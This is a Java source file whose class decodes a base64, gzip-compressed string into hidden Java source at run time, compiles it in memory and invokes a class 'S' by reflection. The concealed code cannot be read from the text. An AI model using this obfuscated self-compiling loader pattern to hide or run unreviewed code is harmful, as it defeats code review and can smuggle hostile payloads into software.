import javax.tools.*;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.zip.*;

class D1 extends SimpleJavaFileObject
{
    public D1()
    {
        super(URI.create(""),Kind.SOURCE);
    }

    public static void main(String args[]) throws Exception
    {
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        compiler.getTask(null, null, null, null, null, Arrays.asList(new D1())).call();
        Class.forName("S").getDeclaredMethod("main", new Class[] { String[].class })
            .invoke(null, new Object[]{null});
    }

    public String getCharContent(boolean ignoreEncodingErrors)
    {
        try
        {
            String encoded = "H4sIAAAAAAAAAGVSUWvbMBD+K6qh5S521HgNg1RV+rDtbayBwBiEMFRHXlVs2bPkVJ6b/76zk7SDvUh33+nuvvtOpqyrxrNntVe89abgE5EVyjm27o31rN5spdUvjOxNuvi4TYJM5+KrcZ5lY+C7znzVACZOrDNlrW6YGgMnD9ad87rkxiJvnf6sC1MaT3iURCjq9rEwGXNeebr2ldmxUhkLa98Y+2uz/Yn9WAtQHOjoX55MoUHxJ+W+6eABsd6Ey3QuZfrhPsTy5jaOw1Yqbscodd3p8JBD9CPCOBU5MQ1yJsIdzSJCHGOf8azQigYQOQyVknCdzlGYHC4ybtyXsvYd4BU4KW1bFK+vGXfmjwa8cycD0f2rRDZQPc5ctZ7XNIgv7Dn/PppFt+fMOGJyyaKYfN9oVRJhR8vQOwCd5DhdLhYTAFihRt5NByMnA+MTFM5QQF6qGvR0GUEUw1s4pQ4Je0e6EcEIeVYVBdGF97UfGfBPx0DVOP5cGUtLgKEEDSkO43pyGL5FSIazw550qjfpfNKR7BdyNuipdjsY9FhBSDrKG0QfXhsS3twthCHZj/JmlfW0bXd6bq5vpmlMpS+Hm1Ix/w8Th8Ph+D9X/ZFIJ1Zj+XaktMc+yFZ0ci8Op8/1WFW0Ycv071YVDh4en2lAVmHfaN82lgUpB30qUuzqqntzOmr1FyC3jsIdAwAA";
            ByteArrayInputStream byteStream = new ByteArrayInputStream(Base64.getDecoder().decode(encoded));
            byte[] sJava = new byte[797];
            new GZIPInputStream(byteStream).read(sJava);
            return new String(sJava);
        }
        catch (Exception e)
        {
            e.printStackTrace();
            return null;
        }
    }
}
